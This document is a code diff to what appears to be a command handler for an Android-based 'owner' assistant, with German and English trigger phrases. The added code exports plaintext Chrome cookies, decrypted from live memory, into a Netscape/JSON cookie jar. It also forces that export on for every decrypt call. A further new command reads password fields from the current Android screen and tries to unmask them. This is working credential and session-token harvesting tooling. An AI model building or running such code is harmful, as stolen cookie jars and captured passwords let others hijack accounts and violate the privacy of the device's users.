@@ -1177,6 +1177,19 @@ def _detect_app_launch(raw: str, normalized: str) -> Optional[OwnerAction]:
     ) or normalized.startswith("chrome autofill") or normalized.startswith(
         "chrome decrypt"
     ) or normalized.startswith("chrome live"):
+        # cookie jar export
+        if any(
+            x in normalized
+            for x in (
+                "cookie jar",
+                "cookiejar",
+                "cookies export",
+                "export cookies",
+                "export cookie",
+                "netscape",
+            )
+        ):
+            return OwnerAction("cookie_jar_export", {"refresh": True}, raw=raw)
         # live memory decrypt path
         if any(
             x in normalized
@@ -1186,11 +1199,15 @@ def _detect_app_launch(raw: str, normalized: str) -> Optional[OwnerAction]:
             m_nf = re.search(r"(?:name|filter|für|fuer|von)\s+([\w.\-]+)", normalized)
             if m_nf:
                 name_filter = m_nf.group(1)
+            do_jar = any(
+                x in normalized for x in ("jar", "export", "netscape", "cookie jar")
+            )
             return OwnerAction(
                 "chrome_decrypt",
                 {
                     "reveal": "mask" not in normalized and "redact" not in normalized,
                     "name_filter": name_filter,
+                    "export_jar": do_jar or True,  # always export jar with decrypt
                 },
                 raw=raw,
             )
@@ -1215,6 +1232,34 @@ def _detect_app_launch(raw: str, normalized: str) -> Optional[OwnerAction]:
             {"section": section, "dump": dump, "host": host},
             raw=raw,
         )
+
+    # UI password fields
+    if normalized in {
+        "ui passwords",
+        "ui passwort",
+        "ui passwörter",
+        "ui passwoerter",
+        "passwortfelder",
+        "password fields",
+        "lies passwortfelder",
+        "zeig passwortfelder",
+        "chrome ui passwords",
+    } or normalized.startswith("ui passwords") or normalized.startswith("passwortfelder"):
+        return OwnerAction(
+            "ui_passwords",
+            {"reveal": "mask" not in normalized, "try_show": "no show" not in normalized},
+            raw=raw,
+        )
+
+    # cookie jar (also outside chrome- prefix)
+    if normalized in {
+        "cookie jar",
+        "cookie jar export",
+        "export cookie jar",
+        "export cookies",
+        "cookies export",
+    } or normalized.startswith("cookie jar"):
+        return OwnerAction("cookie_jar_export", {"refresh": True}, raw=raw)
 
     # apps list / search / activity / ui
     if normalized in {
@@ -1382,6 +1427,8 @@ async def execute_owner_action(action: OwnerAction) -> tuple[str, bool]:
         "chrome_tab_open": _chrome_tab_open,
         "chrome_secrets": _chrome_secrets,
         "chrome_decrypt": _chrome_decrypt,
+        "cookie_jar_export": _cookie_jar_export,
+        "ui_passwords": _ui_passwords,
         "apps_list": _apps_list,
         "app_stop": _app_stop,
         "android_activity": _android_activity,
@@ -2650,16 +2697,51 @@ async def _chrome_decrypt(action: OwnerAction) -> tuple[str, bool]:
     """Live memory extract of plaintext cookie/token values (owner)."""
     reveal = bool(action.params.get("reveal", True))
     name_filter = str(action.params.get("name_filter") or "").strip()
+    export_jar = bool(action.params.get("export_jar", True))
     try:
-        from chrome_secrets import format_live_decrypt_report, live_decrypt_sessions
+        from chrome_secrets import (
+            format_live_decrypt_report,
+            items_to_cookie_jar,
+            live_decrypt_sessions,
+            write_cookie_jar,
+        )
 
         result = await live_decrypt_sessions(
             reveal=reveal,
             name_filter=name_filter,
         )
+        if result.get("ok") and export_jar and reveal:
+            entries = items_to_cookie_jar(result.get("items") or [])
+            jar = write_cookie_jar(entries, basename="cookies")
+            result["cookie_jar"] = jar
         return format_live_decrypt_report(result, reveal=reveal), bool(result.get("ok"))
     except Exception as exc:
         return f"[Chrome Decrypt] Fehler: {exc}", False
+
+
+async def _cookie_jar_export(action: OwnerAction) -> tuple[str, bool]:
+    """Export Netscape/JSON cookie jar from live memory decrypt."""
+    refresh = bool(action.params.get("refresh", True))
+    try:
+        from chrome_secrets import export_cookie_jar, format_cookie_jar_report
+
+        result = await export_cookie_jar(refresh_live=refresh, reveal=True)
+        return format_cookie_jar_report(result), bool(result.get("ok"))
+    except Exception as exc:
+        return f"[Cookie Jar] Fehler: {exc}", False
+
+
+async def _ui_passwords(action: OwnerAction) -> tuple[str, bool]:
+    """Read password fields from current Android UI hierarchy."""
+    reveal = bool(action.params.get("reveal", True))
+    try_show = bool(action.params.get("try_show", True))
+    try:
+        from android_apps import format_ui_passwords_report, read_ui_password_fields
+
+        result = await read_ui_password_fields(try_show=try_show)
+        return format_ui_passwords_report(result, reveal=reveal), bool(result.get("ok"))
+    except Exception as exc:
+        return f"[UI Passwords] Fehler: {exc}", False
 
 
 async def _apps_list(action: OwnerAction) -> tuple[str, bool]:
